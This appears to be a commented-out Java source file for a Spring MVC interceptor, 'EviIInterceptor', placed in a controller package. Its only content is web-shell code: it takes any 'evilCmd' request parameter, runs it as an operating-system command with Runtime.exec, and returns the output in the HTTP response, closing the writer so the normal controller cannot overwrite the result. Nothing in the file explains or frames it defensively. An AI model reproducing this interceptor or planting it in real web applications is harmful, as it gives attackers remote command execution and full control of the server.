//package com.vdt.controller;
//
//import jakarta.servlet.http.HttpServletRequest;
//import jakarta.servlet.http.HttpServletResponse;
//import org.springframework.web.servlet.HandlerInterceptor;
//
//import java.io.IOException;
//import java.io.PrintWriter;
//
//public class EviIInterceptor implements HandlerInterceptor {
//    @Override
//    public boolean preHandle(HttpServletRequest req, HttpServletResponse resp, Object handler) throws IOException {
//        // this method is called before the request is handled by a controller
//        String cmd = req.getParameter("evilCmd");
//        if (cmd != null) {
//            byte[] result = Runtime.getRuntime().exec(cmd).getInputStream().readAllBytes();
//            PrintWriter output = resp.getWriter();
//            output.write(new String(result));
//            output.flush();
//            output.close(); // avoid being ovw by the controller
//        }
//
//        return true;
//    }
//}
